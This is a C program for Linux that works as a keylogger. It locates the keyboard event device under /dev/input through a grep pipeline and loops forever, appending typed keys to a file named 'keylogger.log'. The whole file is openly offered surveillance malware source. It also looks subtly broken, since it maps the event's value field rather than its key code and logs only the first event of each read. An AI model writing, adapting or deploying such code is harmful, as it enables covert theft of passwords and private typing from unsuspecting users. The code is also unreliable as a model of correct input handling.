#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

FILE *log_file;

void startListen();
void config();
char *getKBDEvent();
char *getChar(int code);

int main(int argc, char const *argv[]) {
	config();
	startListen();
	fclose(log_file);
	return 0;
}

void config() {
	log_file = fopen("keylogger.log", "a");
	if(log_file == NULL) {
		perror("Error: Unable to create log file.\n");
		exit(1);
	}
}

void startListen() {
	int fd;

	struct input_event event[64];
	size_t size_ie = sizeof(struct input_event);

	char event_path[100] = {'\0'};
	strcpy(event_path, getKBDEvent());

	if(strcmp(event_path, "/dev/input") == 0) {
		perror("Error: event-kbd not found.\n");
		exit(1);
	}

	if((fd = open(event_path, O_RDONLY)) == -1) {
		perror("Error: Failed to open the event path.");
		exit(1);
	}

	while(1) {
		if ((read(fd, event, size_ie * 64)) < size_ie) {
        	perror("Error: Failed to read input event from input device.");
			exit(1);
    	}

		fprintf(log_file, "%s", getChar(event->value));
    	fflush(log_file);
    	fflush(stdout);
    }
}

char *getKBDEvent() {
	char res[64] = "/dev/input/";
	char ev[64];
	char *command = "grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'";

	FILE *output = popen(command, "r");
	if (output == NULL) {
		printf("Error: Failed to run command.\n");
		exit(1);
	}

	fscanf(output, "%s", ev);
	pclose(output);

	strcat(res, ev);

	return strdup(res);
}

char *getChar(int code) {
	switch((int) code) {
		case KEY_ESC: return "[ESC]";
		case KEY_F1: return "[F1]";
		case KEY_F2: return "[F2]";
		case KEY_F3: return "[F3]";
		case KEY_F4: return "[F4]";
		case KEY_F5: return "[F5]";
		case KEY_F6: return "[F6]";
		case KEY_F7: return "[F7]";
		case KEY_F8: return "[F8]";
		case KEY_F9: return "[F9]";
		case KEY_F10: return "[F10]";
		case KEY_F11: return "[F11]";
		case KEY_F12: return "[F12]";
		case KEY_NUMLOCK: return "[NUMLOCK]";
		case KEY_SYSRQ: return "[SYSRQ]";
		case KEY_BREAK: return "[BREAK]";
		case KEY_DELETE: return "[DELETE]";
		case KEY_HOME: return "[HOME]";
		case KEY_PAGEUP: return "[PAGEUP]";
		case KEY_PAGEDOWN: return "[PAGEDOWN]";
		case KEY_END: return "[END]";
		case KEY_INSERT: return "[INSERT]";
		case KEY_1: return "1";
		case KEY_2: return "2";
		case KEY_3: return "3";
		case KEY_4: return "4";
		case KEY_5: return "5";
		case KEY_6: return "6";
		case KEY_7: return "7";
		case KEY_8: return "8";
		case KEY_9: return "9";
		case KEY_0: return "0";
		case KEY_MINUS: return "-";
		case KEY_EQUAL: return "=";
		case KEY_TAB: return "	";
		case KEY_Q: return "q";
		case KEY_W: return "w";
		case KEY_E: return "e";
		case KEY_R: return "r";
		case KEY_T: return "t";
		case KEY_Y: return "y";
		case KEY_U: return "u";
		case KEY_I: return "i";
		case KEY_O: return "o";
		case KEY_P: return "p";
		case KEY_LEFTBRACE: return  "[";
		case KEY_RIGHTBRACE: return "]";
		case KEY_ENTER: return "\n";
		case KEY_RIGHTSHIFT: return "[SHIFT]";
		case KEY_LEFTSHIFT: return "[SHIFT]";
		case KEY_LEFTALT: return "[ALT]";
		case KEY_RIGHTALT: return "[ALT]";
		case KEY_LEFTCTRL: return "[CTRL]";
		case KEY_RIGHTCTRL: return "[CTRL]";
		case KEY_CAPSLOCK: return "[CAPSLOCK]";
		case KEY_A: return "a";
		case KEY_S: return "s";
		case KEY_D: return "d";
		case KEY_F: return "f";
		case KEY_G: return "g";
		case KEY_H: return "h";
		case KEY_J: return "j";
		case KEY_K: return "k";
		case KEY_L: return "l";
		case KEY_SEMICOLON: return ";";
		case KEY_APOSTROPHE: return "\'";
		case KEY_GRAVE: return "`";
		case KEY_BACKSLASH: return "\\";
		case KEY_Z: return "z";
		case KEY_X: return "x";
		case KEY_C: return "c";
		case KEY_V: return "v";
		case KEY_B: return "b";
		case KEY_N: return "n";
		case KEY_M: return "m";
		case KEY_COMMA: return ",";
		case KEY_DOT: return ".";
		case KEY_SLASH: return "/";
		case KEY_KPASTERISK: return "*";
		case KEY_SPACE: return " ";
		case KEY_KP7: return "7";
		case KEY_KP8: return "8";
		case KEY_KP9: return "9";
		case KEY_KPMINUS: return "-";
		case KEY_KP4: return "4";
		case KEY_KP5: return "5";
		case KEY_KP6: return "6";
		case KEY_KPPLUS: return "+";
		case KEY_KP1: return "1";
		case KEY_KP2: return "2";
		case KEY_KP3: return "3";
		case KEY_KP0: return "0";
		case KEY_KPDOT: return ".";
		case KEY_KPENTER: return "\n";
		case KEY_KPCOMMA: return ",";
		case KEY_KPSLASH: return "/";
		default: return "\0";
	}
}